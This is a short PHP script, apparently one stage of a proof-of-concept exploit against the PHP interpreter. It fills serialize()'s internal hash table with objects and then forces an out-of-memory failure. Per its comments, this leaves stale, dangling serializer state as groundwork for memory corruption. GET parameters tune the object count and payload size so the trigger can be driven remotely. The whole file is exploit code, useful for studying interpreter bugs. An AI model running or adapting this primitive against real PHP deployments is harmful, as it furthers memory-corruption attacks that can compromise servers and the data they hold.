<?php
// Encode-side producer: fill BG(serialize).data->ht with object/reference
// entries (2 buckets each), then OOM inside serialize() on a large payload.
// Leaves lock=0, level=1, data=<stale>, ht.nNumUsed == ht.nTableSize.
class P { public $x = 1; public function __sleep() { return ['x']; } }
$k = (int)($_GET['k'] ?? 8);   // objects -> 2 hash buckets each
$n = (int)($_GET['n'] ?? 60);  // MiB of strings serialized after the objects
$a = [];
for ($i = 0; $i < $k; $i++) { $a[] = new P(); }
for ($i = 0; $i < $n; $i++) { $a[] = str_repeat('A', 1 << 20); }
$s = serialize($a);
echo "serialize-returned len=", strlen($s), "\n";
